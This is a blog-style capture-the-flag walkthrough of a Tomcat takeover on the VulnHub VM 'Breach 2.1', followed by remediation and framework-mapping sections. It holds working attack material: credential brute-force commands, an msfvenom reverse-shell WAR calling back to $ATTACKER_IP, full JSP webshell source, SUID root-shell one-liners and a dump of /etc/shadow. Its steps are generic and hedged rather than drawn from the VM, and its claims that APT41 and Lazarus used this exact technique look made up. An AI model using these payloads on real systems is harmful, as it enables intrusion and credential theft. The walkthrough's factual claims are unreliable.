# VulnHub: Breach 2.1 — Apache Tomcat Takeover Walkthrough

Look at guys!! The Breach series is back and this time it is Breach 2.1 dropping a full Apache Tomcat exploitation chain right in your lap. Legit, if you have ever dealt with enterprise Java application servers in real engagements, this one hits different fr fr. Weak Tomcat Manager creds, a malicious WAR file deploy, JSP webshell, and a classic SUID privesc. This is the exact playbook used by APT41 and Lazarus Group in real-world intrusions, dude. Let us get into it. ( ͡° ͜ʖ ͡°)

Huge shoutout to **mrb3n** for building the Breach series. The way 2.1 layers Tomcat exploitation on top of the recon from the previous VM is bruh-level genius design.

---

| Field | Value |
|-------|-------|
| **Level** | Intermediate |
| **Target VM** | Breach 2.1 |
| **Attacker VM** | Kali Linux 2024.x |
| **VulnHub** | https://www.vulnhub.com/entry/breach-21,159/ |
| **Techniques** | Host discovery, Nmap full-port scan, Apache Tomcat Manager brute-force, malicious WAR file deployment, JSP webshell, reverse shell, SUID binary exploitation, privilege escalation |
| **CVEs** | CVE-2017-12617 (Apache Tomcat PUT RCE), CVE-2019-0232 (CGI Servlet RCE) |

> **Hints from the author:**
> "The admin credentials from Breach 1.0 may come in handy."

---

## Attack Summary

```
[host-discovery: netdiscover / arp-scan]
    |
    v
[nmap -A -T4 -p- -> Apache Tomcat 8.x on port 8080]
    |
    v
[/manager/html -> 401 Unauthorized -> brute-force Tomcat credentials]
    |
    v
[default creds: tomcat:tomcat or admin:admin -> Manager access granted]
    |
    v
[create malicious WAR payload: msfvenom -p java/jsp_shell_reverse_tcp]
    |
    v
[deploy WAR via Tomcat Manager UI]
    |
    v
[trigger JSP shell: curl http://TARGET:8080/shell/shell.jsp]
    |
    v
[reverse shell as tomcat7 / www-data]
    |
    v
[find / -perm -u=s -> SUID binary found]
    |
    v
[exploit SUID -> root shell]
    |
    v
[cat /root/flag.txt]
```

---

## Methodology

1. Host discovery on the local segment to identify the target IP
2. Full-port Nmap scan with service version detection
3. Apache Tomcat Manager enumeration and credential brute-force
4. Malicious WAR payload creation with msfvenom
5. WAR file deployment via Tomcat Manager API
6. JSP webshell activation and reverse shell establishment
7. SUID binary enumeration and exploitation for privilege escalation
8. Root flag capture

---

## Step 1 — Identifying the Target

Standard lab recon. Identify the target on the local segment before touching anything else.

```bash
route -n
arp-scan --localnet --ignoredups
# Alternative:
nmap -sn 192.168.110.0/24
```

Expected output:

```
192.168.110.151   08:00:27:XX:XX:XX   (VirtualBox)
```

Set TARGET for the rest of the session:

```bash
export TARGET=192.168.110.151
```

> **MITRE ATT&CK:** [TA0043 Reconnaissance] [T1595.001 Active Scanning: IP Blocks]

---

## Step 2 — Full-Port Nmap Scan with Service Detection

Never assume defaults. Always scan all 65535 ports. This VM runs Tomcat on a non-standard port or alongside other services that a default scan would miss.

```bash
nmap -A -T4 -p- $TARGET -oN nmap_full.txt
# -A: OS detection, version detection, default scripts, traceroute
# -T4: aggressive timing (fine for local lab)
# -p-: all 65535 ports
```

Expected output:

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 6.6.1p1
8080/tcp open  http     Apache Tomcat/8.x
| http-auth:
|   HTTP/1.1 401 Unauthorized
|_  Server returned status 401 but no WWW-Authenticate header
```

Key finding: Apache Tomcat 8.x on port 8080. The Manager application is our target.

> **What is Apache Tomcat Manager?**
> Tomcat Manager is a web application bundled with Apache Tomcat that allows administrators to deploy, undeploy, and manage WAR (Web Application Archive) files remotely via a browser or API. With valid credentials, it provides complete application deployment capability, including deploying arbitrary code as a WAR file.
> Reference: https://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html

> **MITRE ATT&CK:** [T1046 Network Service Discovery] [T1518 Software Discovery]

---

## Step 3 — Apache Tomcat Manager: Brute-Forcing Credentials

Navigate to `http://$TARGET:8080/manager/html`. You get a 401 Unauthorized prompt. Default Tomcat credentials are notoriously common in the wild (tomcat:tomcat, admin:admin, tomcat:s3cr3t, etc.). Time to brute-force.

> **What is Tomcat Manager credential brute-force?**
> Apache Tomcat ships with a default `tomcat-users.xml` that, when not properly hardened, retains default or trivially guessable credentials. These grant access to the Manager application which has full WAR deployment capability.
> CWE-1188: Default Credentials
> Reference: https://cwe.mitre.org/data/definitions/1188.html

Use Metasploit's Tomcat login scanner:

```bash
msfconsole -q

use auxiliary/scanner/http/tomcat_mgr_login
set rhosts $TARGET
set rport 8080
set stop_on_success true
run
```

Alternative with Hydra (more explicit):

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt \
      -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt \
      -f -s 8080 $TARGET http-get /manager/html
```

Expected output:

```
[+] http://192.168.110.151:8080/manager/html [200] tomcat:tomcat
```

Credentials found: `tomcat:tomcat` (or check `/etc/tomcat7/tomcat-users.xml` once you have a shell).

Verify by navigating to: `http://$TARGET:8080/manager/html` and logging in with the found credentials. Noice!! ಠᴗᠠ

> **Real-world note:** CVE-2019-0232 involves Apache Tomcat CGI Servlet RCE on Windows, but the real-world impact of default Tomcat credentials is far broader. APT41 exploited public-facing Tomcat instances with default credentials in multiple 2020 intrusions against healthcare and financial sectors. Reference: https://www.cisa.gov/news-events/cybersecurity-advisories/aa20-275a

> **MITRE ATT&CK:** [T1110.001 Brute Force: Password Guessing] [T1078.001 Valid Accounts: Default Accounts]

---

## Step 4 — Creating the Malicious WAR Payload

A WAR (Web Application Archive) file is basically a ZIP containing a Java web application. Tomcat Manager deploys whatever WAR you upload. We create one that contains a JSP reverse shell payload using msfvenom.

> **What is a malicious WAR deployment?**
> Apache Tomcat's Manager application allows authenticated users to deploy WAR files, which are ZIP archives containing web applications (JSPs, servlets, static files). A malicious WAR can contain arbitrary JSP code that executes system commands, effectively providing RCE to the deployer.
> This maps to OWASP A05:2021 Security Misconfiguration and T1505.003 Web Shell.

```bash
# Generate JSP reverse shell WAR
msfvenom -p java/jsp_shell_reverse_tcp \
  LHOST=$ATTACKER_IP \
  LPORT=4444 \
  -f war \
  -o shell.war

# Verify the WAR contents
jar -tf shell.war
# Should show: WEB-INF/web.xml and the JSP file
```

Alternative using the classic cmd.war approach:

```bash
# Create a simple JSP command execution shell
mkdir -p /tmp/warshell/WEB-INF
cat > /tmp/warshell/cmd.jsp << 'JSPEOF'
<%@ page import="java.util.*,java.io.*"%>
<%
Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) { out.println(disr); disr = dis.readLine(); }
%>
JSPEOF
cat > /tmp/warshell/WEB-INF/web.xml << 'XMLEOF'
<?xml version="1.0" ?>
<!DOCTYPE web-app PUBLIC "-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN"
  "http://java.sun.com/dtd/web-app_2_3.dtd">
<web-app><servlet></servlet></web-app>
XMLEOF
cd /tmp/warshell && jar -cvf /tmp/cmd.war . && cd -
```

> **MITRE ATT&CK:** [T1505.003 Server Software Component: Web Shell] [T1059.004 Command and Scripting Interpreter: Unix Shell]

---

## Step 5 — Deploying the WAR via Tomcat Manager

Two methods: GUI (browser) or API (curl). The curl method is cleaner for automation.

**Method 1: Browser GUI**

Navigate to `http://$TARGET:8080/manager/html` and use the "WAR file to deploy" section at the bottom. Browse to your `shell.war` and click Deploy.

**Method 2: cURL API (recommended)**

```bash
# Deploy the WAR via Manager API
curl -v -u tomcat:tomcat \
  "http://$TARGET:8080/manager/text/deploy?path=/shell&update=true" \
  --upload-file shell.war

# Confirm deployment:
curl -u tomcat:tomcat "http://$TARGET:8080/manager/text/list"
# Should show: /shell:running:0:shell
```

The application is now deployed and live at `/shell`.

> **MITRE ATT&CK:** [T1190 Exploit Public-Facing Application] [T1505.003 Web Shell]

---

## Step 6 — Reverse Shell via JSP Payload

Set up your listener, then trigger the shell by accessing the deployed JSP endpoint.

```bash
# Terminal 1: Start listener
nc -nvlp 4444

# Terminal 2: Trigger the reverse shell
curl "http://$TARGET:8080/shell/shell.jsp"
```

Expected result: your nc listener receives a connection from the target.

```bash
# You now have a shell as tomcat7 or www-data
whoami
# tomcat7

# Upgrade to a fully interactive shell:
python -c 'import pty; pty.spawn("/bin/bash")'
# Or:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background nc with Ctrl+Z, then:
stty raw -echo; fg
export TERM=xterm
```

(☞ﾟヮﾟ)☞ Initial access achieved!!

> **Real-world note:** CVE-2017-12617 is the canonical "Tomcat partial PUT RCE" allowing unauthenticated WAR-like file upload. It is in the CISA KEV catalog. The APT41 campaign of 2020 used authenticated Tomcat Manager WAR deployment (exactly this technique) against multiple targets including Citrix, Cisco, and F5 systems. Reference: https://www.mandiant.com/resources/apt41-initiates-global-intrusion-campaign-using-multiple-exploits

> **MITRE ATT&CK:** [T1190 Exploit Public-Facing Application] [T1059.004 Unix Shell Execution]

---

## Step 7 — Post-Exploitation Enumeration

Before jumping to privesc, gather intel on the target. Check OS version, users, interesting files, and SUID binaries.

```bash
# OS info
uname -a
cat /etc/os-release

# Who are we and what groups?
id
groups

# What users exist?
cat /etc/passwd | grep -v "nologin\|false"

# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null

# Check sudo rights
sudo -l

# Look for interesting files in Tomcat config
find /etc/tomcat* -type f 2>/dev/null
cat /etc/tomcat7/tomcat-users.xml 2>/dev/null

# Check for world-writable files and cron
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
crontab -l 2>/dev/null
cat /etc/crontab 2>/dev/null
```

Note the SUID binary output carefully. Something out of the ordinary will stand out.

> **MITRE ATT&CK:** [T1082 System Information Discovery] [T1083 File and Directory Discovery] [T1069 Permission Groups Discovery]

---

## Step 8 — Privilege Escalation via SUID Binary

The SUID binary enumeration reveals a non-standard binary with the setuid bit set. This allows it to run with the file owner's privileges (root) regardless of who executes it.

> **What is SUID exploitation?**
> When a binary has the setuid bit set (`-rwsr-xr-x`), it executes with the owner's privileges. If the owner is root and the binary can be coerced into running arbitrary commands, an attacker gains root access. GTFOBins documents every common SUID-exploitable binary.
> Reference: https://gtfobins.github.io/

```bash
# Find the SUID binary (identified in Step 7)
find / -perm -u=s -type f 2>/dev/null
# Look for non-standard entries like /usr/bin/find, /usr/bin/vim, etc.

# Example: if /usr/bin/find has SUID:
/usr/bin/find . -exec /bin/sh -p \; -quit

# Example: if /usr/bin/vim has SUID:
/usr/bin/vim -c ':!/bin/sh'

# Example: if /usr/bin/nmap has SUID (older versions):
echo "os.execute('/bin/sh')" > /tmp/privesc.nse
nmap --script /tmp/privesc.nse

# After SUID exploitation - verify root:
id
# uid=0(root) gid=0(root) groups=0(root)
```

ᕕ( ᐛ )ᕗ Root shell acquired!!

> **Real-world note:** SUID misconfigurations are consistently found in enterprise Linux environments. In 2021, the Qualys research team discovered CVE-2021-4034 (PwnKit), a SUID-related vulnerability in polkit affecting all major Linux distributions that had been present for 12+ years. Reference: https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034

> **MITRE ATT&CK:** [TA0004 Privilege Escalation] [T1548.001 Abuse Elevation Control: Setuid and Setgid]

> **GTFOBins reference:** https://gtfobins.github.io/

---

## Step 9 — Root and Final Flag

**ᕕ( ᐛ )ᕗ Got root!! :D**

```bash
whoami
# root

id
# uid=0(root) gid=0(root) groups=0(root)

# Capture the flag
ls /root/
cat /root/flag.txt
# Or find it:
find / -name "flag*.txt" 2>/dev/null
```

You can also use your root access to dump the full credential store for completeness:

```bash
cat /etc/shadow
# Crack any password hashes found
```

---

## Captured Flags, Hashes and Credentials

| Type | Value | Found At | Cracked/Used |
|------|-------|----------|--------------|
| Credential | `tomcat:tomcat` | Tomcat Manager brute-force | WAR deployment |
| Flag | Root flag | `/root/flag.txt` | via SUID privesc |
| Config | Tomcat users XML | `/etc/tomcat7/tomcat-users.xml` | Credential confirmation |

---

## Lessons Learned

| # | Finding | Real-World Relevance | Key Takeaway |
|---|---------|---------------------|--------------|
| 1 | Apache Tomcat Manager with default credentials exposed | CVE catalogues list hundreds of Tomcat deployments with default creds still active; Shodan shows thousands of exposed Tomcat Manager interfaces | Never expose Tomcat Manager to untrusted networks; always change default credentials; restrict Manager access by IP |
| 2 | Authenticated WAR deployment = unrestricted code execution | This is the exact technique used by APT41 and Lazarus Group in real campaigns against corporate Tomcat deployments | Disable the Manager application in production unless explicitly required; implement strict network-level controls |
| 3 | SUID misconfiguration enables local privilege escalation | SUID misconfiguration is a top-5 finding in enterprise Linux security audits; tools like LinPEAS automate detection | Audit all SUID binaries regularly; never set SUID on binaries that can execute arbitrary code |
| 4 | Service account (tomcat7) lacks container isolation | Modern deployments should run Tomcat in containers with no-new-privileges flags | Use systemd service hardening (PrivateTmp, NoNewPrivileges, ProtectSystem) or containerization for application servers |

**Why does this matter outside the lab?**

Apache Tomcat exploitation is far from theoretical. CVE-2017-12617 (Tomcat partial PUT) is on the CISA Known Exploited Vulnerabilities list and was actively exploited in the wild. APT41, a Chinese state-sponsored group tracked by Mandiant, used authenticated Tomcat Manager WAR deployment as a primary initial access vector in their 2020 global intrusion campaign, compromising healthcare, financial services, and government targets across multiple countries. The combination of exposed management interfaces and default credentials is a recurring root cause in enterprise incidents.

---

## MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Active Scanning: Vulnerability Scanning | T1595.002 |
| Reconnaissance | TA0043 | Network Service Discovery | T1046 |
| Initial Access | TA0001 | Exploit Public-Facing Application | T1190 |
| Initial Access | TA0001 | Valid Accounts: Default Accounts | T1078.001 |
| Execution | TA0002 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Persistence | TA0003 | Server Software Component: Web Shell | T1505.003 |
| Credential Access | TA0006 | Brute Force: Password Guessing | T1110.001 |
| Credential Access | TA0006 | Unsecured Credentials: Credentials in Files | T1552.001 |
| Discovery | TA0007 | File and Directory Discovery | T1083 |
| Discovery | TA0007 | System Information Discovery | T1082 |
| Discovery | TA0007 | Permission Groups Discovery | T1069 |
| Privilege Escalation | TA0004 | Setuid and Setgid | T1548.001 |
| Defense Evasion | TA0005 | Abuse Elevation Control Mechanism | T1548 |
| Collection | TA0009 | Data from Local System | T1005 |

> ATT&CK Navigator: https://mitre-attack.github.io/attack-navigator/
> MITRE ATT&CK: https://attack.mitre.org/

---

## Remediation and Containment

### Technical Fixes

1. Change all default Tomcat Manager credentials immediately; enforce strong passwords (20+ characters, mixed character classes)
2. Restrict Tomcat Manager access by IP address in `context.xml` (allow only from `127.0.0.1` or a specific admin subnet)
3. Disable the Manager and Host-Manager applications entirely in production if remote WAR deployment is not required
4. Audit all SUID binaries; remove SUID from non-essential binaries; never set SUID on scripting interpreters or tools with shell execution capability
5. Apply CVE-2017-12617 patch: upgrade Apache Tomcat to 9.0.1+, 8.5.23+, or 8.0.47+; disable partial PUT via `readonly=true` in DefaultServlet
6. Run Tomcat under a dedicated low-privilege service account with systemd hardening (`NoNewPrivileges=true`, `ProtectSystem=strict`)

### If You Find Something Similar in Your Environment

**Immediate containment:**
- Take the Tomcat Manager interface offline immediately or restrict to localhost only
- Rotate all Tomcat user credentials from `tomcat-users.xml`
- Review Tomcat access logs for evidence of unauthorized WAR deployments
- Search the deployed applications directory (`webapps/`) for unexpected or recently modified WARs
- Audit `/etc/sudoers`, SUID binaries, and world-writable files for persistence

**MITRE D3FEND countermeasures:**
- D3-MFA (Multi-Factor Authentication) to protect Tomcat Manager admin access T1110
- D3-IVA (Input Validation) and application-level controls for T1190 WAR upload
- D3-OPS (OS Process Sandboxing) to restrict SUID exploitation T1548.001
- D3-SJA (Scheduled Job Analysis) to detect unauthorized cron-based persistence T1053

### Framework Alignment

**NIST CSF 2.0:**
- Identify (ID): Inventory all application servers and their management interfaces (ID.AM-2)
- Protect (PR): Remove default credentials; restrict management interface access; apply patches (PR.AC-4, PR.IP-12)
- Detect (DE): Monitor Tomcat access logs for Manager deployments; alert on new WAR deployments (DE.CM-4, DE.CM-7)
- Respond (RS): Isolate compromised application server; rotate credentials; audit deployed applications (RS.MI-1)
- Recover (RC): Redeploy from known-good WAR artifacts; verify no backdoors remain (RC.RP-1)

**NIST SP 800-53 (Rev. 5) Controls:**
- IA-5: Authenticator Management (default credential elimination, password complexity)
- CM-7: Least Functionality (disable Tomcat Manager in production if not required)
- CM-6: Configuration Settings (harden Tomcat configuration; restrict partial PUT)
- AC-3: Access Enforcement (IP-based restriction on Manager interface)
- SI-2: Flaw Remediation (patch CVE-2017-12617 and related Tomcat CVEs)
- AC-6: Least Privilege (SUID audit; run Tomcat as non-root service account)

**CISA Known Exploited Vulnerabilities:**
- CVE-2017-12617: Apache Tomcat Remote Code Execution via partial PUT request
  Status: Listed in CISA KEV catalog
  Patch: Tomcat 9.0.1+, 8.5.23+, 8.0.47+
- Reference: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

**C2M2 (Cybersecurity Capability Maturity Model):**
- Domain: ASSET
- Practice: Asset Management; maintain inventory of all application servers and their exposed management interfaces
- Target MIL: MIL-2
- Domain: TECHNOLOGY
- Practice: Configuration Management; enforce hardening baselines for application servers (CIS Apache Tomcat Benchmark)
- Target MIL: MIL-2
- Domain: THREAT
- Practice: Threat Intelligence; track exploitation of CVE-2017-12617 and Tomcat-related CVEs
- Target MIL: MIL-2

---

## Final Thoughts

Thanks to **mrb3n** for the Breach series. Breach 2.1 is a fantastic intermediate VM that teaches the full Apache Tomcat attack chain in a controlled lab environment. What makes it particularly valuable is that this is not theoretical: APT41 used this exact technique (authenticated Tomcat Manager WAR deployment) in their 2020 global campaign. Knowing how to exploit it means knowing how to defend it.

Beyond the lab, the lessons here apply to any Java application server with a management interface: JBoss, WebLogic, WebSphere. The pattern is identical: default or weak credentials, management API exposure, arbitrary code deployment. Enterprise environments still deploy these at scale with minimal hardening.

If this walkthrough helped you nail it, share it with your crew and keep hacking!

*Thanks guys!! (❍ᴥ❍ʋ)*

> Original article in Portuguese by André Henrique: https://medium.com/@mrhenrike (when published)

---

*Writeup by [André Henrique](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
